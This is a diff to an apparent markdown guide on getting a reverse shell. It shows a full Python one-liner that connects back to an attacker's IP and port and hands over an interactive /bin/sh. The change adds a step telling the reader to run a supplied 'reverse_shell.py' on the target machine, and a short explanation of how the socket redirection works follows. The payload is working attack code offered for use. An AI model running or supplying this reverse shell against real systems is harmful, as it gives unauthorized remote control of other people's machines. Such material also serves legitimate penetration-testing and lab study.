@@ -31,6 +31,11 @@ Run this command on the target machine, replacing `IP_ADDRESS` with your attacke
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+You can also use the file that I provided you, "reverse_shell.py" and execute it on the target machine (make sure to replace the `IP_ADDRESS` with your attacker machine's IP and `1234` with your chosen port number) :
+```bash
+python3 reverse_shell.py
+```
+
 ### Explanation:
 - Establishes a TCP socket connection to the attacker’s IP and port.
 - Redirects standard input (`stdin`), standard output (`stdout`), and standard error (`stderr`) to the socket.
